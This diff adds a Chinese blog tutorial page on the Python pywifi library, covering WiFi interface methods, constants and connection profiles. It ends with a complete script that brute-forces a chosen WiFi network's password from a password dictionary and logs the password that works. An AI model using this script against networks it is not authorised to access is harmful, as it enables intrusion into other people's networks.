@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" name="viewport" content="width=device-width">
+    <!-- meta使用viewport来适配移动端浏览器 -->
+    <link rel="icon" href="../../../img/icon.png">
+    <link rel="stylesheet" href="../../../sheet.css" type="text/css" class="sheet">
+    <link rel="stylesheet" href="../../../mobile-sheet.css" type="text/css">
+    <script src="../../../skin.js"></script>
+    <title>尼伯龙根</title>
+</head>
+
+<body>
+    <div class="head-title">
+        <a href="../../../index.html"><img src="../../../img/icon.png" width="30" height="30" alt="icon" style="vertical-align:text-bottom;"/><span style="font-size: 20px;"> Niebelungen尼伯龙根</span></a>
+        <span>
+		&nbsp;&nbsp;&nbsp;<a href="../../article.html" class="hyperlink" style="border-bottom: 2px solid rgb(50, 50, 105);">贴文</a>
+		&nbsp;&nbsp;&nbsp;<a href="../../../about/about.html" class="hyperlink" id="about">关于</a>
+	    </span> 
+        <a href="javascript:void(0);" title="更换皮肤"><img src="../../../img/sun and moon.png" alt="暗夜模式" id="shift-skin" onclick="clickSkin()" style="width: 20px; height: 20px"></a>
+    </div>
+    
+    <div class="nav-article">
+        <p>Category:</p>
+        <ul>
+            <div class="dropdown web">
+                <li>Web开发</li>
+                <div class="dropdown-content-web">
+                    <ul>
+                        <li><a href="../../css/css-index.html">CSS</a></li>
+                        <li><a href="../../html/html-index.html">HTML</a></li>
+                        <li><a href="../../javascript/index-js.html">JavaScript</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="dropdown daily">
+                <li>日常</li>
+                <div class="dropdown-content-daily">
+                    <ul>
+                        <li><a href="../../travels/travels-index.html">游记</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="dropdown">
+                <li>编程</li>
+                <div class="dropdown-content">
+                    <ul>
+                        <li><a href="./python-index.html">Python</a></li>
+                        <li><a href="../c/c-index.html">C/C++</a></li>
+                        <li><a href="../others/others-index.html">其它</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div>
+                <li><a href="../../unclassified/unclassified-index.html">未分类</a></li>
+            </div>
+        </ul>
+    </div>
+
+    <div class="article">
+        <h1>python - pywifi模块的使用</h1><hr>
+        <div class="article-text">
+            <p>
+                引入pywifi模块是为了用python代码来控制wifi、获取wifi甚至尝试暴力破译wifi密码<br>
+                在这之前需要做的是用pip获取到pywifi和comtypes的模块（可以用pip list查看自己有没有这两个模块）<br>
+            </p>
+            <hr>
+            <p>
+                <h3>wifi接口</h3>
+                pywifi中定义了PyWiFi类来管理接口，使用<span class="code">pywifi.PyWiFi()</span>来创建这样一个实例<br>
+                这个实例就是表示计算机WiFi接口的。该对象具有<span class="code">interfaces()成员变量</span>，其返回值是一个网卡列表，在一般情况下列表中的第一个元素即是需要的wifi网卡，所以可以直接通过<span class="code">interfaces()[0]</span>来获取<br>
+                <br>
+                通过网卡的<span class="code">name()成员变量</span>可以查看网卡的名称<br>
+                <br>
+                当获取到这个网卡之后，我们可以进行一系列的操作，主要利用的是以下网卡的成员函数：
+                <table style="overflow: auto;">
+                    <tr><th>成员函数</th><th>意义</th></tr>
+                    <tr><td>scan()</td><td>使用网卡扫描附近的wifi（即AP站），通常需要等待一段时间才有结果，所以要搭配time.sleep()使用</td></tr>
+                    <tr><td>scan_result()</td><td>返回附近wifi的列表</td></tr>
+                    <tr><td>disconnect()</td><td>断开网卡的wifi连接</td></tr>
+                    <tr><td>status()</td><td>返回网卡状态，使用pywifi的常量库进行对比</td></tr>
+                    <tr><td>connect(profile配置文件名)</td><td>使用已添加的配置文件进行wifi连接</td></tr>
+                    <tr><td>network_profiles()</td><td>返回当前连接的配置文件列表，配置文件储存了所有已经连接过的wifi的信息，在列表中的排序是按照最近使用排序的</td></tr>
+                    <tr><td>add_network_profile(profile配置文件名)</td><td>添加AP配置文件，为连接做准备，并返回一个添加成功的Profile对象</td></tr>                    
+                    <tr><td>remove_all_network_profiles()</td><td>删除所有配置文件，建议在添加之后使用</td></tr>
+                </table><br>
+                其中返回的wifi列表的每个对象，都具有以下属性值：
+                <table>
+                    <tr><th>成员变量</th><th>意义</th></tr>
+                    <tr><td>ssid</td><td>wifi的ssid，就是wifi名</td></tr>
+                    <tr><td>bssid</td><td>wifi的mac地址</td></tr>
+                    <tr><td>signal</td><td>wifi的信号强度，值越大信号越强</td></tr>
+                    <tr><td colspan="2">......</td></tr>
+                </table><br>
+            </p>
+            <hr>
+            <p>
+                <h3>常量库</h3>
+                为了引入pywifi的常量库，需要使用<span class="code">from pywifi import const</span><br>
+                其状态常量为：
+                <pre>
+# Define interface status.
+IFACE_DISCONNECTED = 0
+IFACE_SCANNING = 1
+IFACE_INACTIVE = 2
+IFACE_CONNECTING = 3
+IFACE_CONNECTED = 4
+
+# Define auth algorithms.
+AUTH_ALG_OPEN = 0
+AUTH_ALG_SHARED = 1
+
+# Define auth key mgmt types.
+AKM_TYPE_NONE = 0
+AKM_TYPE_WPA = 1
+AKM_TYPE_WPAPSK = 2
+AKM_TYPE_WPA2 = 3
+AKM_TYPE_WPA2PSK = 4
+AKM_TYPE_UNKNOWN = 5
+
+# Define ciphers.
+CIPHER_TYPE_NONE = 0
+CIPHER_TYPE_WEP = 1
+CIPHER_TYPE_TKIP = 2
+CIPHER_TYPE_CCMP = 3
+CIPHER_TYPE_UNKNOWN = 4
+
+KEY_TYPE_NETWORKKEY = 0
+KEY_TYPE_PASSPHRASE = 1
+                </pre>
+            </p>
+            <hr>
+            <p>
+                <h3>配置文件</h3>
+                配置文件主要有以下几个参数：
+                <table>
+                    <tr><th>成员变量</th><th>意义</th></tr>
+                    <tr><td>ssid</td><td>AP/wifi的名称</td></tr>
+                    <tr><td>auth</td><td>AP的认证算法，现在几乎所有的AP都使用开放算法const.AUTH_ALG_OPEN</td></tr>
+                    <tr><td>akm</td><td>AP的密钥管理类型(以列表保存，故可以有多种)，一般向列表中添加AKM_TYPE_WPA2PSK</td></tr>
+                    <tr><td>cipher</td><td>AP的密码类型，一般设为const.CIPHER_TYPE_CCMP</td></tr>
+                    <tr><td>key</td><td>AP的关键，就是要输入的密码。如果无密码则要指定为CIPHER_TYPE_NONE</td></tr>
+                </table><br>
+                要生成配置，需要使用pywifi中的profile类，使用<span class="code">pywifi.Profile()方法</span>创建一个这样的对象，之后设定好上面的各成员变量即可<br>
+                （其中akm在创建时是一个空列表，直接用append()来添加值）
+            </p>
+            <hr>
+            <p>
+                实战代码参考：使用弱口令字典暴力破解wifi密码
+                <pre>
+import pywifi
+import time
+from pywifi import const
+
+'''本程序生成logpwd.lod日志文件'''
+
+def wificonnect(iface, pwd, ssid):
+    iface.disconnect()
+    time.sleep(0.5)
+    while True:
+        if iface.status() == const.IFACE_DISCONNECTED:
+            profile = pywifi.Profile()
+
+            #设置profile对象的基本成员变量
+            profile.ssid = ssid
+            profile.auth = const.AUTH_ALG_OPEN
+            profile.akm.append(const.AKM_TYPE_WPA2PSK)
+            profile.cipher = const.CIPHER_TYPE_CCMP
+            profile.key = pwd
+
+            iface.remove_all_network_profiles()
+            tem_profile = iface.add_network_profile(profile)
+            iface.connect(tem_profile)
+
+            time.sleep(2)   #等待一段时间判断是否连接成功
+            if iface.status() == const.IFACE_CONNECTED:
+                return 1
+            else:
+                return 0
+        else:
+            print("已有连接存在，正在重新尝试") #当wifi处于正在连接的状态时重试
+            iface.disconnect()
+
+
+iface = pywifi.PyWiFi().interfaces()[0] #取得网卡对象
+
+ssid = input("请输入爆破的wifi名：")
+path = input("请输入密码本文件路径: ")
+pwddic = open(path, 'r')
+log = open('logpwd.log', 'w')   #日志文件
+
+times = 0
+while True:
+    times += 1
+    pwd = pwddic.readline()[:-1]    #去掉文件中每行密码末尾的换行符
+    result = wificonnect(iface, pwd, ssid)  #调用连接函数并取得返回值
+    if result == 1:
+        print(str(times) + ".连接成功: " + pwd)
+        log.writelines(str(times) + ".连接成功: " + pwd + '\n')
+        break
+    elif result == 0:
+        print(str(times) + ".连接失败: " + pwd)
+        log.writelines(str(times) + ".连接失败: " + pwd + '\n')
+
+    if not pwd:
+        print("破解结束")
+        break
+input("pause......")
+pwddic.close()
+log.close()</pre>
+            </p>
+        </div>
+    </div>
+</body>
+
+</html>
